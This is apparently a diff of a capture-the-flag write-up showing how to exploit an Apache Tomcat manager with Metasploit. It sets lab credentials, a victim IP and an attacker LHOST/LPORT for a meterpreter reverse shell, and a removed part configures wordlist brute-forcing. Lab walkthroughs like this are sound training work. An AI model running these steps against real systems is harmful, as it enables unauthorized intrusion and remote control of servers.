@@ -75,21 +75,36 @@ Not all the vulnerabilities are named in the same format.
 
 ## 10. Use Metasploit to exploit the service and get a shell on the system. 
 
-Start Metasploit with `:> msfconsole` and conduct a search for Tomcat with `:> search tomcat`. Option 64 is the manager login vulnerability. ` user 64` will load the exploit.  
+ Start Metasploit with `:> msfconsole` and conduct a search for Tomcat with `:> search tomcat`. Option 65 is a reverse shell. `:>  use 18` will load the exploit.  
 
-![Start Metasploit](assets/tools-08.png)
+ ![Start Metasploit](assets/tools-08a.png)  
 
-Once the exploit is loaded, `show options` and begin editing the parameters with known information.
-````bash
-set PASS_FILE /usr/share/wordlists/rockyou.txt
-set RHOSTS 10.201.108.97
-set RPORT 1234
-set USER_FILE /usr/share/wordlists/SecLists/Usernames/Names/names.txt
-exploit
-````
-![Ready to Exploit](assets/tools-09a.png)
+For additional detail, the exploit is an authenticated upload code execution that will work because we have discovered credentials already.  
 
+ ![Start Metasploit](assets/tools-09.png)  
 
+ Once the exploit is loaded, `show options` and begin editing the parameters with known information.
+ ```` bash
+ set HttpPassword bubbles
+ set HttpUsername bob
+ set RHOSTS 10.201.108.97 # Victim machine
+ set RPORT ????
+ set TARGETURI /manager # the default installation location
+ set LHOST 10.201.33.191 # Attacker IP
+ set LPORT 4444 # basic network security should block port 4444; consider other options.
+ exploit
+ ````
+
+ ![Ready to Exploit](assets/tools-10.png)
+
+ Exploited and the meterpreter reverse shell is achieved.  
+ 
 ## 11. What user did you get a shell as?
 
-## 12. What flag is found in the root directory?
+ Finding your identity does not work with `:> whoami`. Use `:> getuid` instead.  
+
+ ![Identity](assets/tools-11.png)
+
+## 12. What flag is found in the root directory?  
+
+ The two comamands that reveal the answer are `:> ls` and `:> cat`.  
